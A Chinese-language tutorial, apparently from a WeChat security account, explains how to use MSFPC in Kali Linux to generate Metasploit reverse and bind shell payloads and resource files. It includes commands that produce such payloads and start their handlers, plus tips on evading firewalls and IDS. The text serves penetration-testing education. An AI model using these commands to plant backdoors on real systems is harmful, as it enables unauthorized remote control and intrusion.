> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1QSCg0jXDBw2aveAXLypFw)

注意：本文中所有操作是在 Kali linux 2020.4 中完成。如果使用 Kali linux2020.1 等版本，可能会因为 msfpc 没有 root 权限，在调用 ifconfig 命令时出错，此时将文中的 eth0 替换为本机 IP 地址即可。  

MSFvenom Payload Creator（MSFPC）是一个使用起来十分方便的 payload 生成器，可以根据用户的选择来生成 Metasploit 的各种 payload。有了它，我们就不需要使用的长长的 msfvenom 命令来产生 payload，从而大大的节省了使用者的时间和精力。

你在使用 MSFPC 之前应该先在系统中安装 Metasploit，MSFPC 只是一个单纯的 bash 脚本，这也意味着它需要在 linux 或者 unix 等系统上运行。（微软已经宣布在 Windows10 上支持 bash）。

如果你使用的不是 Kali 的话，需要安装 MSFPC，下载地址为 https://github.com/g0tmi1k/msfpc。

![](https://mmbiz.qpic.cn/mmbiz_png/jb2tm25BPQSwo4JuIMgLLUnB7BGWg1DgWoJECfxjvC6qH3ViaiagxT011RvRmw4l8U1NSKicYPWHeicZ0sI7aSP73A/640?wx_fmt=png)

而 Kali linux 中则已经事先内置了 MSFPC，你只需要在终端中输入 msfpc 就可以启动。

 ![](https://mmbiz.qpic.cn/mmbiz_png/jb2tm25BPQSwo4JuIMgLLUnB7BGWg1DgiaSKVmjicW7J7Gb8lK78JVI1ZjYqS6shftkeFhOd1icBNFg6WjpRve9Qg/640?wx_fmt=png)

MSFPC 中产生 payload 也是通过命令实现的，主要的参数有 TYPE、DOMAIN/IP 等，它们分别对应的含义如下所示：

l TYPE:MSFPC 中支持的 payload 类型如上图所示，可以分别指定为 APK [android], ASP, ASPX, Bash [.sh], Java [.jsp], Linux [.elf], OSX [.macho], Perl [.pl], PHP, Powershell [.ps1], python [.py], Tomcat [.war], Windows [.exe //.dll] 等。这个选项相当于 msfvenom 中的 -f 参数。

l DOMAIN/IP: 这个选项相当于 msfvenom 中的 LHOST 参数。也就是主控端的 IP 地址。

l PORT：这个选项相当于 msfvenom 中的 LPORT 参数。也就是主控端的端口。

l CMD/MSF: 这个选项决定了当 payload 执行后，我们将以何种形式来控制目标系统。比如我们想使用标准的命令行来控制目标时，就可以使用 CMD 选项。如果目标系统是 windows，我们就可以使用如下图所示的 cmd 命令行方式来控制目标。而如果目标是 Linux 操作系统，我们则使用 /bin/bash 的方式来控制目标。

     ![](https://mmbiz.qpic.cn/mmbiz_png/jb2tm25BPQSwo4JuIMgLLUnB7BGWg1DgwMmt35NGwqpMOKwQedshiad37NKEI4S61RRlLzFNUMdDbevXKvMKBGw/640?wx_fmt=png)

下面我们使用 MSFPC 来创建一个 payload，使用的命令如下所示：

$ msfpc cmd windows eth0

成功执行这条命令之后将会产生一个 payload，它将会允许你通过使用 CMD 命令行的方式来控制目标，主控端的 IP 地址通过 eth0 设置成了当前 kali 主机的 IP 地址。

![](https://mmbiz.qpic.cn/mmbiz_png/jb2tm25BPQSwo4JuIMgLLUnB7BGWg1DgwV72JaVSNEXORgiaicA2V6ebLtw5AzIB4Cz0BpE7G5kzxjbU15lhTo4g/640?wx_fmt=png)

从图中可以看出来，这条命令一共产生了两个文件：

l 可执行 payload 文件: windows-shell-staged-reverse-tcp-443.exe

l Rc 文件: windows-shell-staged-reverse-tcp-443-exe.rc

这两个文件的命名很容易理解，它们是根据创建时使用的选项命名的。我们刚刚创建的可执行 payload 文件一旦在目标系统中运行起来，它就会连接到主控端的 443 端口（反向连接），此时我们就可以利用命令提示符 shell 来控制目标了。我们在创建 payload 文件的时候，尽量选择使用 reverse（反向）来代替 bind（正向）。

### **资源文件（****Resource file****，rc）**

按照 Metasploit 官方的解释，资源文件可以帮你自动化的完成一些重复任务。实际上，资源文件就像是批处理脚本，它里面是一组命令。当你在 Metasploit 中加载这个脚本时，这些命令就会按照顺序执行。你可以将一系列 Metasploit 控制命令连接在一起来创建资源文件。

下面我们可以使用 cat 来查看刚刚生成的 rc 文件：

 ![](https://mmbiz.qpic.cn/mmbiz_png/jb2tm25BPQSwo4JuIMgLLUnB7BGWg1DgXcLY6Hwia46bIgBgXPRYEDiaKA4Hiag6nPlBkRtIWETu7Quia6wfhickEYg/640?wx_fmt=png)

这里使用的 payload 选择的参数是 cmd，对应的类型是 windows/shell/reverse_tcp 。

如果你希望获得更方便的控制权限（就像 meterpreter 中那样），这时就可以使用 msf 参数，例如：

Msfpc msf windows eth0

 ![](https://mmbiz.qpic.cn/mmbiz_png/jb2tm25BPQSwo4JuIMgLLUnB7BGWg1DgXSicKZwuImKePS9Hvwm5BiaiaQxUVA1vUJ8UWAfV0jhyT7dHmX0pQ3gCw/640?wx_fmt=png)

在使用 msf 选项之后，我们查看从 MSFPC 生成的资源文件，就会两次在 “set payload” 时的差异：

![](https://mmbiz.qpic.cn/mmbiz_png/jb2tm25BPQSwo4JuIMgLLUnB7BGWg1DgpDLU4HHNQ3wN9Rox8BfqEVKfoCZRwRcicmG4HnQE4Yf3EjvQNJhzhRw/640?wx_fmt=png)

这时的 payload 已经被设置为了 windows/meterpreter/reverse_tcp。写好的资源文件可以使用 msfconsole 来执行，执行的命令如下所示：

**msfconsole -q -r '/home/kali/windows-meterpreter-staged-reverse-tcp-443-exe.rc'**

这里面的 -q 表示使用静默模式（你将看不到 metasploit 的执行过程），-r 表示执行资源文件。不使用参数 -q 则可以看到如下所示的 metasploit 调用过程。

![](https://mmbiz.qpic.cn/mmbiz_png/jb2tm25BPQSwo4JuIMgLLUnB7BGWg1DgjAB9KFNrAicKbzLStgiczftHibP7mkmOZwlUg3DkdaoJib05qaaFOViboLw/640?wx_fmt=png)

我们在这个实例中使用的 payload 是基于 x86 的，但目标系统是给予 x64 体系结构。我们建议使用的 payload 要与操作系统的体系结构相匹配。在 Metasploit 中，我们可以从基于 x86 的进程迁移到基于 x64 的进程上，也可以使用 Metasploit post 模块 post/windows/manage/archmigrate。

l BIND/REVERSE: 目标系统上执行 payload 后与主控端建立的连接类型。

l BIND: 将打开目标系统上的一个端口，我们可以使用主控端连接到该端口。这种方式成功的几率并不大，因为目标系统的防火墙规则往往会阻止我们连接到它的端口。

当我们使用下面的命令：

msfpc bind msf windows eth0

就可以生成一个正向的 payload。

![](https://mmbiz.qpic.cn/mmbiz_png/jb2tm25BPQSwo4JuIMgLLUnB7BGWg1DgNRSAUJ3quHYTiauvL6vWUS9IwGFT1uQ5icicibT6iauJS7YYeicgRaPRGLHQ/640?wx_fmt=png)

我们查看生成的资源文件可以看到使用 windows/meterpreter/bind_tcp 代替了 reverse_tcp,

l REVERSE（反向）: 这个 payload 会在攻击者主控端的计算机上打开一个端口，一旦 payload 在目标设备上执行，就会从目标设备上主动回连主控端。这种连接叫做反向连接，它是绕过入口防火墙的一种非常好的方法，但如果出口（出站）防火墙规则禁止了连接，则可以阻止反向连接。默认情况下，MSFPC 将使用 REVERSE 方式来生成 payload。

l STAGED/STAGELESS: payload 所使用的类型。

l STAGED: 这个参数会将 payload 分成多个阶段发送，这样做的好处是可以有效降低 payload 的大小，默认情况下，MSFPC 生成的就是这种多个阶段发送的 payload

l STAGELESS: 这个参数会产生一个完整的 payload，比多个阶段发送的 payload 更稳定、更可靠，但与分级 payload 相比，这种 payload 太大了。

 msfpc cmd stageless bind windows eth0

我们查看生成的这个命令生成的资源文件。

![](https://mmbiz.qpic.cn/mmbiz_png/jb2tm25BPQSwo4JuIMgLLUnB7BGWg1DgE2doUc6DyjfVOR7Wq6non1ia6sdIP2lbb7B1Os4WewqfoXia7u4wjH9w/640?wx_fmt=png)

可以看到这里面 payload 被设置为 windows/shell_bind_tcp，这是一个 stageless 类型的 payload，它对应着 Metasploit 中的 windows/shell/bind_tcp。

l TCP/HTTP/HTTPS/FIND_PORT: payload 与 handler 通信所使用的方法。

l TCP：这是在目标服务器上执行 payload 后的标准通信方法。这种通信方法可以用于任何类型的 payload 格式，但由于其不加密的性质，很容易被 IDS 检测到并被防火墙和 IPS 阻止。

l HTTP：如果 MSFPC 使用此选项，则 payload 将使用 HTTP 作为通信方法。payload 将在端口 80 上通信。如果目标系统上只有端口 80 打开，则可以使用此选项绕过防火墙。由于其未加密的性质，很容易被 IDS 和 IPS 检测到。

l HTTPS：此选项用于生成将使用 SSL 通信的 payload。如果需要隐秘的进行反向连接时，建议使用此选项。

l FIND_PORT：当无法从公共端口（80、443、53、21）获得反向连接时，使用此选项。如果设置了此选项，MSFPC 生成的 payloa 将尝试所有 1-65535 端口进行通信。

l BATCH Mode: 在批处理模式下，MSFPC 可以使用尽可能多的类型组合生成多个 payload。

![](https://mmbiz.qpic.cn/mmbiz_png/jb2tm25BPQSwo4JuIMgLLUnB7BGWg1DgW5QV5GlicTLjQLRU8NibRaWYfNAqo6O81HG88koNU7LyNhjI9FB2s8hg/640?wx_fmt=png)

MSFPC 会为 Windows 生成所有组合的 payload 以及它们各自的资源文件（.rc）

l LOOP Mode: 这种模式会产生各种类型的多重 payload，MSFPC 还可以生成给定 LHOST 的所有 payload。当我们不了解目标平台操作系统的类型时，这一点非常有用：

msfpc **loop 192.168.****157.170**

下面是该命令所生成的 payload 与资源文件。

![](https://mmbiz.qpic.cn/mmbiz_png/jb2tm25BPQSwo4JuIMgLLUnB7BGWg1Dg1vVDXTvt92ZgYYRpfY9kia1XCwm1uWF7xqE3qdSSYIysWXtiaQN4pPTA/640?wx_fmt=png)

l VERBOSE: 如果要获取有关 MSFPC 在生成 payload 时使用的值的更多信息，可以使用此选项。

 msfpc cmd stageless bind windows eth0 verbose

![](https://mmbiz.qpic.cn/mmbiz_png/jb2tm25BPQSwo4JuIMgLLUnB7BGWg1DgbiaqTwISugBF2icicwasdOOFonCicym6BNOe7fE0WEOC1jLfuHLkGXpiaJg/640?wx_fmt=png)

扫描下方二维码加入星球学习

加入后邀请进入内部微信群，内部微信群永久有效！

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cniaUZzJeYAibE3v2VnNlhyC6fSTgtW94Pz51p0TSUl3AtZw0L1bDaAKw/640?wx_fmt=png) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cT2rJYbRzsO9Q3J9rSltBVzts0O7USfFR8iaFOBwKdibX3hZiadoLRJIibA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicBVC2S4ujJibsVHZ8Us607qBMpNj25fCmz9hP5T1yA6cjibXXCOibibSwQmeIebKa74v6MXUgNNuia7Uw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWa9Y7Ac6gb6JZVymJwS3gu8cRey7icGjpsvppvqqhcYo6RXAqJcUwZy3EfeNOkMRS37m0r44MWYIYmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/XWPpvP3nWaicjovru6mibAFRpVqK7ApHAwiaEGVqXtvB1YQahibp6eTIiaiap2SZPer1QXsKbNUNbnRbiaR4djJibmXAfQ/640?wx_fmt=jpeg) ![](https://mmbiz.qpic.cn/mmbiz_png/XWPpvP3nWaicJ39cBtzvcja8GibNMw6y6Amq7es7u8A8UcVds7Mpib8Tzu753K7IZ1WdZ66fDianO2evbG0lEAlJkg/640?wx_fmt=png)  

目前 40000 + 人已关注加入我们

![](https://mmbiz.qpic.cn/mmbiz_gif/XWPpvP3nWa9FwrfJTzPRIyROZ2xwWyk6xuUY59uvYPCLokCc6iarKrkOWlEibeRI9DpFmlyNqA2OEuQhyaeYXzrw/640?wx_fmt=gif)